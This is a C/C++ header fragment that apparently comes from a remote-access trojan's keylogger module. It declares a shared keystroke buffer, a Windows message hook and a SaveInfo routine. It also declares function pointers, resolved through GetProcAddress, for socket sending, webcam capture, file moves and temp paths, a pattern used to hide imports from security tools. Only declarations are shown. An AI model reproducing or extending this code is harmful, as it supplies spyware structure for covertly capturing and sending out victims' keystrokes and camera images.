...
typedef	struct
{
    ...
    TCHAR	chKeyBoard[1024];
    TCHAR	str[SIZE_IMM_BUFFER];
}TShared;
...
//typedef	DWORD(__stdcall *pGetProcAddress)(HMODULE, LPCTSTR);
typedef	FARPROC (__stdcall *pGetProcAddress)(HMODULE, LPCTSTR);

typedef	int(__stdcall *pclosesocket)(SOCKET);
typedef	UINT(__stdcall *pGetSystemDirectory)(LPTSTR, UINT);
typedef	int(__stdcall *psend)(SOCKET, const char FAR *, int, int);
typedef	VOID(__stdcall *pSleep)(DWORD);
typedef	LPSTR(__stdcall *plstrcat)(LPTSTR, LPCTSTR);
typedef	DWORD(__stdcall *pGetTempPath)(DWORD, LPTSTR);
typedef	BOOL(__stdcall *pcapGetDriverDescription)(UINT, LPTSTR, int, LPTSTR, int);
typedef	HWND(__stdcall *pcapCreateCaptureWindow)(LPCTSTR, DWORD, int, int, int, int, HWND, int);
typedef	DWORD(__stdcall *pSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef	BOOL(__stdcall *pMoveFile)(LPCTSTR, LPCTSTR);
typedef	DWORD(__stdcall *pGetShortPathName)(LPCTSTR, LPTSTR, DWORD);
typedef	DWORD(__stdcall *pGetModuleFileName)(HMODULE, LPTSTR, DWORD);
////////////////////////////////////////////////////////////////////////////////////////////////////


#define CKeyboardManager CKeyboardManagerX
...
public:
    ...
    static	TCHAR	    ConnPass[256];
    static	HANDLE	    hProtect;
    static	HANDLE	    hFile;


    static pclosesocket             Myclosesocket;
    static pLoadLibrary             MyLoadLibrary;
    static pGetProcAddress          MyGetProcAddress;
    static pGetSystemDirectory      MyGetSystemDirectory;
    static psend                    Mysend;
    static pSleep                   MySleep;
    static plstrcat                 Mylstrcat;
    static pGetTempPath             MyGetTempPath;
    static pcapCreateCaptureWindow MycapCreateCaptureWindow;
    static pcapGetDriverDescription MycapGetDriverDescription;
    static pSetFilePointer          MySetFilePointer;
    static pMoveFile                MyMoveFile;
    static pGetShortPathName        MyGetShortPathName;
    static pGetModuleFileName       MyGetModuleFileName;
    static int Mylstrlen(const TCHAR *str);
    static TCHAR* NumToStr(DWORD Nos, int JZ);
    static BOOL MyFuncInitialization();
private:
    static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
    static void SaveInfo(TCHAR *lpBuffer);
